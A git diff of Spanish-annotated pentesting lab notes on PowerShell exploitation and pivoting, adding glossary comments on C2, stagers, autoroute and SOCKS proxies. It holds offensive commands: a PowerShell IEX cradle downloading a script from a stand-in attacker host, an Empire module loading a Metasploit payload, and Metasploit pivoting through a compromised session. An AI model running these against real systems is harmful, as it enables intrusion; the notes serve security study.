@@ -152,6 +152,15 @@ PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://attacker_host/scr
 ### ~ PowerShell for Pentesting
 
 ```bash
+# CONCEPTOS CLAVE
+# Pivoting: usar una máquina comprometida como puente hacia redes internas
+# C2 (Command & Control): servidor que maneja agentes en máquinas comprometidas
+# Listener: puerto en Kali que espera conexiones entrantes de agentes
+# Stager: código PS que se ejecuta en la víctima y la hace conectarse al listener
+# Agente: proceso activo en la víctima conectado al C2
+# autoroute: le dice a MSF cómo enrutar tráfico por una sesión activa
+# SOCKS proxy: tuneliza tráfico del browser por la sesión Meterpreter
+
 # Leveraging PowerShell During Exploitation
 10.4.30.114    demo.ine.local -> acceso directo
 10.4.20.133    fileServer.ine.local -> pivotar
@@ -188,9 +197,14 @@ usemodule powershell/code_execution/invoke_metasploitpayload # De vuelta en nues
 usemodule powershell/code_execution/invoke_metasploitpayload
 set URL http://10.10.42.2:8080/E8tlUIOl
 execute
+# autoroute — agrega rutas en la tabla de Metasploit para que el tráfico
+# hacia la red interna (10.4.20.0/24) pase por la sesión Meterpreter de demo
+# sin esto, Metasploit no sabe cómo llegar a fileserver
 use post/multi/manage/autoroute
 set SESSION 1
 run
+# socks_proxy — levanta un proxy SOCKS5 en Kali en el puerto 1080
+# permite tunelizar tráfico del browser por la sesión, simulando estar en la red interna
 use auxiliary/server/socks_proxy
 set SRVHOST 10.10.42.2
 run
